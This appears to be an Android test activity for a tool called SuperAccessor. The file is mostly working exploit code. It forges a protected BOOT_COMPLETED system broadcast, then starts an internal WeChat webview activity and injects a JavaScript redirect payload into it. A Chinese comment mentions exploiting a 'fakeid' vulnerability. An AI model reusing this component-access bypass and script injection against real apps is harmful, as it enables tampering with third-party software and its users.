package com.boyliang.componentsuperaccessor.test;


import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.util.Log;

import com.boyliang.componentsuperaccessor.R;
import com.boyliang.componentsuperaccessor.SuperAccessor;

public final class TestMainActivity extends Activity{
	public final static String HTML = 
		    "<script language=\"javascript\" type=\"text/javascript\">" +
		    "window.location.href=\"http://sina.cn/\"; " +
		    "</script>";

	private BroadcastReceiver mBootReciever = new BroadcastReceiver(){
		
		public void onReceive(Context context, Intent intent) {
			Log.i("TTT", "Boot Completed. Info is " + intent.getStringExtra("info"));
		};
	};
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.testmainactivity);
		Log.i("TTT", "TestMainActivity.onCreate");
		
		registerReceiver(mBootReciever, new IntentFilter("android.intent.action.BOOT_COMPLETED"));

		//发送开机广播
		Intent intent_for_broadcast = new Intent("android.intent.action.BOOT_COMPLETED");
		intent_for_broadcast.putExtra("info", "i am a bad boy!");
		SuperAccessor.sendBroadcast(this, intent_for_broadcast);
		
		//用微信打开新浪，3.5.1版本之后不再有效，这里还要触发fakeid漏洞的利用
		Intent intent_for_activity = new Intent();
		intent_for_activity.setComponent(new ComponentName("com.tencent.mm", "com.tencent.mm.plugin.webview.ui.tools.ContactQZoneWebView"));
		intent_for_activity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		intent_for_activity.putExtra("data", HTML);
		intent_for_activity.putExtra("baseurl", "http://sina.cn/");
		intent_for_activity.putExtra("title", "I am bad boy");
		SuperAccessor.startActivity(this, intent_for_activity);
	}
	
	@Override
	protected void onDestroy() {
		unregisterReceiver(mBootReciever);
		super.onDestroy();
	}
}
